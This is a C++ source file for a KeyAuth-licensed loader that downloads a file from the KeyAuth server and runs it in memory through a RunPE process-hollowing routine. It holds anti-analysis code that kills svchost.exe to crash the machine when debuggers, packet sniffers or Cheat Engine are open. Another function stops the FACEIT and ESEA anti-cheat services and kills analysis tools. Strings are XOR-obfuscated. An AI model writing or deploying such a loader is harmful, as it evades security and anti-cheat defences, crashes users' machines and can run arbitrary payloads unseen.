#include <iostream>
#include "api/KeyAuth.hpp"
#include "protextion/xorstr.hpp"
#include <tlhelp32.h>
#include <fstream>
#include <filesystem>
#include <tchar.h>
#include <urlmon.h>
#pragma comment(lib, "urlmon.lib")
#include <bcrypt.h>

//protect
#include "protextion/Imports.hpp"
#include "protextion/lazy.h"
#include "protextion/protectmain.h"
#include "protextion/safe_ptr.hpp"
#include "protextion/skCrypt.h"
#include "protextion/VMProtectSDK.h"
using namespace KeyAuth;
using namespace std;

std::string name = XorStr("XXXXXX"); // application name. right above the blurred text aka the secret on the licenses tab among other tabs
std::string ownerid = XorStr("XXXXXX"); // ownerid, found in account settings. click your profile picture on top right of dashboard and then account settings.
std::string secret = XorStr("XXXXXX"); // app secret, the blurred text on licenses tab and other tabs
std::string version = XorStr("1.0"); // leave alone unless you've changed version on website

api KeyAuthApp(name, ownerid, secret, version);
#pragma comment(lib, "ntdll.lib")


void bsod()
{
    //this can  break kids pc sometimes is it worth it?
	system(XorStr("taskkill.exe /f /im svchost.exe").c_str());
}

int runPE64(
    LPPROCESS_INFORMATION lpPI,
    LPSTARTUPINFO lpSI,
    LPVOID lpImage,
    LPWSTR wszArgs,
    SIZE_T szArgs
)
{
    mainprotect();
    WCHAR wszFilePath[MAX_PATH];
    if (!GetModuleFileName(
        NULL,
        wszFilePath,
        sizeof wszFilePath
    ))
    {
        return -1;
    }
    WCHAR wszArgsBuffer[MAX_PATH + 2048];
    ZeroMemory(wszArgsBuffer, sizeof wszArgsBuffer);
    SIZE_T length = wcslen(wszFilePath);
    memcpy(
        wszArgsBuffer,
        wszFilePath,
        length * sizeof(WCHAR)
    );
    wszArgsBuffer[length] = ' ';
    memcpy(
        wszArgsBuffer + length + 1,
        wszArgs,
        szArgs
    );
    mainprotect();
    PIMAGE_DOS_HEADER lpDOSHeader =
        reinterpret_cast<PIMAGE_DOS_HEADER>(lpImage);
    PIMAGE_NT_HEADERS lpNTHeader =
        reinterpret_cast<PIMAGE_NT_HEADERS>(
            reinterpret_cast<DWORD64>(lpImage) + lpDOSHeader->e_lfanew
            );
    if (lpNTHeader->Signature != IMAGE_NT_SIGNATURE)
    {
        return -2;
    }
    mainprotect();
    if (!CreateProcess(
        NULL,
        wszArgsBuffer,
        NULL,
        NULL,
        TRUE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        lpSI,
        lpPI
    ))
    {
        return -3;
    }
    mainprotect();
    CONTEXT stCtx;
    ZeroMemory(&stCtx, sizeof stCtx);
    stCtx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(lpPI->hThread, &stCtx))
    {
        TerminateProcess(
            lpPI->hProcess,
            -4
        );
        return -4;
    }
    mainprotect();
    LPVOID lpImageBase = VirtualAllocEx(
        lpPI->hProcess,
        reinterpret_cast<LPVOID>(lpNTHeader->OptionalHeader.ImageBase),
        lpNTHeader->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    if (lpImageBase == NULL)
    {
        TerminateProcess(
            lpPI->hProcess,
            -5
        );
        return -5;
    }
    mainprotect();
    if (!WriteProcessMemory(
        lpPI->hProcess,
        lpImageBase,
        lpImage,
        lpNTHeader->OptionalHeader.SizeOfHeaders,
        NULL
    ))
    {
        TerminateProcess(
            lpPI->hProcess,
            -6
        );
        return -6;
    }

    for (
        SIZE_T iSection = 0;
        iSection < lpNTHeader->FileHeader.NumberOfSections;
        ++iSection
        )
    {
        PIMAGE_SECTION_HEADER stSectionHeader =
            reinterpret_cast<PIMAGE_SECTION_HEADER>(
                reinterpret_cast<DWORD64>(lpImage) +
                lpDOSHeader->e_lfanew +
                sizeof(IMAGE_NT_HEADERS64) +
                sizeof(IMAGE_SECTION_HEADER) * iSection
                );
        mainprotect();
        if (!WriteProcessMemory(
            lpPI->hProcess,
            reinterpret_cast<LPVOID>(
                reinterpret_cast<DWORD64>(lpImageBase) +
                stSectionHeader->VirtualAddress
                ),
            reinterpret_cast<LPVOID>(
                reinterpret_cast<DWORD64>(lpImage) +
                stSectionHeader->PointerToRawData
                ),
            stSectionHeader->SizeOfRawData,
            NULL
        ))
        {
            TerminateProcess(
                lpPI->hProcess,
                -7
            );
            return -7;
        }
    }
    mainprotect();
    if (!WriteProcessMemory(
        lpPI->hProcess,
        reinterpret_cast<LPVOID>(
            stCtx.Rdx + sizeof(LPVOID) * 2
            ),
        &lpImageBase,
        sizeof(LPVOID),
        NULL
    ))
    {
        TerminateProcess(
            lpPI->hProcess,
            -8
        );
        return -8;
    }
    mainprotect();
    stCtx.Rcx = reinterpret_cast<DWORD64>(lpImageBase) +
        lpNTHeader->OptionalHeader.AddressOfEntryPoint;
    if (!SetThreadContext(
        lpPI->hThread,
        &stCtx
    ))
    {
        TerminateProcess(
            lpPI->hProcess,
            -9
        );
        return -9;
    }
    mainprotect();
    if (!ResumeThread(lpPI->hThread))
    {
        TerminateProcess(
            lpPI->hProcess,
            -10
        );
        return -10;
    }
    mainprotect();
    return 0;
}


void DetectDebuggerThread() {
	while (true)
	{
		Sleep(100);
		if (FindWindowA(NULL, ("Resource Monitor"))) { Beep(200, 200); system("taskkill /F /T /IM perfmon.exe"); exit(-1); }
		if (FindWindowA(NULL, ("The Wireshark Network Analyzer"))) { bsod(); }
		if (FindWindowA(NULL, ("Progress Telerik Fiddler Web Debugger"))) { bsod(); }
		if (FindWindowA(NULL, ("Fiddler"))) { bsod(); }
		if (FindWindowA(NULL, ("HTTP Debugger"))) { bsod(); }
		if (FindWindowA(NULL, ("x64dbg"))) { bsod(); }
		if (FindWindowA(NULL, ("dnSpy"))) { bsod(); }
		if (FindWindowA(NULL, ("FolderChangesView"))) { bsod(); }
		if (FindWindowA(NULL, ("BinaryNinja"))) { bsod(); }
		if (FindWindowA(NULL, ("HxD"))) { bsod(); }
		if (FindWindowA(NULL, ("Cheat Engine 7.2"))) { bsod(); }
		if (FindWindowA(NULL, ("Cheat Engine 7.1"))) { KeyAuthApp.ban(); bsod(); }
		if (FindWindowA(NULL, ("Cheat Engine 7.0"))) { bsod(); }
		if (FindWindowA(NULL, ("Cheat Engine 6.9"))) { bsod(); }
		if (FindWindowA(NULL, ("Cheat Engine 7.3"))) { bsod(); }
		if (FindWindowA(NULL, ("Cheat Engine 7.4"))) { bsod(); }
		if (FindWindowA(NULL, ("Cheat Engine 7.5"))) { bsod(); }
		if (FindWindowA(NULL, ("Cheat Engine 7.6"))) { bsod(); }
		if (FindWindowA(NULL, ("Ida"))) { bsod(); }
		if (FindWindowA(NULL, ("Ida Pro"))) { bsod(); }
		if (FindWindowA(NULL, ("Ida Freeware"))) { bsod(); }
		if (FindWindowA(NULL, ("HTTP Debugger Pro"))) { bsod(); }
		if (FindWindowA(NULL, ("Process Hacker"))) { bsod(); }
		if (FindWindowA(NULL, ("Process Hacker 2"))) { bsod(); }
		if (FindWindowA(NULL, ("OllyDbg"))) { bsod(); }
	}
}

void tasky1()
{
	system("net stop FACEIT >nul 2>&1");
	system("net stop ESEADriver2 >nul 2>&1");
	system("sc stop HTTPDebuggerPro >nul 2>&1");
	system("sc stop KProcessHacker3 >nul 2>&1");
	system("sc stop KProcessHacker2 >nul 2>&1");
	system("sc stop KProcessHacker1 >nul 2>&1");
	system("sc stop wireshark >nul 2>&1");
	system("sc stop npf >nul 2>&1");
	system(XorStr("net stop FACEIT >nul 2>&1").c_str());
	system(XorStr(("net stop ESEADriver2 >nul 2>&1")).c_str());
	system(XorStr(("sc stop HTTPDebuggerPro >nul 2>&1")).c_str());
	system(XorStr(("sc stop KProcessHacker3 >nul 2>&1")).c_str());
	system(XorStr(("sc stop KProcessHacker2 >nul 2>&1")).c_str());
	system(XorStr(("sc stop KProcessHacker1 >nul 2>&1")).c_str());
	system(XorStr(("sc stop wireshark >nul 2>&1")).c_str());
	system(XorStr(("sc stop npf >nul 2>&1")).c_str());
	system("taskkill /f /im HTTPDebuggerUI.exe >nul 2>&1");
	system("taskkill /f /im HTTPDebuggerSvc.exe >nul 2>&1");
	system("sc stop HTTPDebuggerPro >nul 2>&1");
	system("taskkill /FI \"IMAGENAME eq cheatengine*\" /IM * /F /T >nul 2>&1");
	system("taskkill /FI \"IMAGENAME eq httpdebugger*\" /IM * /F /T >nul 2>&1");
	system("taskkill /FI \"IMAGENAME eq processhacker*\" /IM * /F /T >nul 2>&1");
	system("taskkill /FI \"IMAGENAME eq fiddler*\" /IM * /F /T >nul 2>&1");
	system("taskkill /FI \"IMAGENAME eq wireshark*\" /IM * /F /T >nul 2>&1");
	system("taskkill /FI \"IMAGENAME eq rawshark*\" /IM * /F /T >nul 2>&1");
	system("taskkill /FI \"IMAGENAME eq charles*\" /IM * /F /T >nul 2>&1");
	system("taskkill /FI \"IMAGENAME eq cheatengine*\" /IM * /F /T >nul 2>&1");
	system("taskkill /FI \"IMAGENAME eq ida*\" /IM * /F /T >nul 2>&1");
	system("taskkill /FI \"IMAGENAME eq httpdebugger*\" /IM * /F /T >nul 2>&1");
	system("taskkill /FI \"IMAGENAME eq processhacker*\" /IM * /F /T >nul 2>&1");
	system("sc stop HTTPDebuggerPro >nul 2>&1");
	system("sc stop KProcessHacker3 >nul 2>&1");
	system("sc stop KProcessHacker2 >nul 2>&1");
	system("sc stop KProcessHacker1 >nul 2>&1");
	system("sc stop wireshark >nul 2>&1");
	system("sc stop npf >nul 2>&1");
}

int main()
{
	mainprotect();
    tasky1();
	system("Color 5");
	SetConsoleTitleA(XorStr("0x9#0001").c_str());
	KeyAuthApp.init();
	system(XorStr("cls").c_str());
	std::thread antiDebug(DetectDebuggerThread);
	std::string key;
	std::cout << XorStr("\nEnter license: ");
	std::cin >> key;
	KeyAuthApp.license(key);
	std::cout << XorStr("\nAuthenticating Key :");
	std::cout << key;
	Sleep(3000);
	std::vector<std::uint8_t> bytes = KeyAuthApp.download("XXXXXX"); // replace 123456 with the fileid of the file you uploaded to KeyAuth that you want to run through RunPE
	HWND ConsWind = GetConsoleWindow();
	DWORD dwRet = 0;
	PROCESS_INFORMATION stPI;
	ZeroMemory(&stPI, sizeof stPI);
	STARTUPINFO stSI;
	ZeroMemory(&stSI, sizeof stSI);
	WCHAR szArgs[] = L"";
	if (!runPE64(
	&stPI,
	&stSI,
	reinterpret_cast<LPVOID>(bytes.data()),
	szArgs,
	sizeof szArgs
	))
	{
	WaitForSingleObject(
	stPI.hProcess,
	INFINITE
	);
	GetExitCodeProcess(
	stPI.hProcess,
	&dwRet
	);
    CloseHandle(stPI.hThread);
	CloseHandle(stPI.hProcess);
	}
	return dwRet;
		
	

}


// Sleep(-1); // this is to keep your application open for test purposes. it pauses your application forever, remove this when you want.
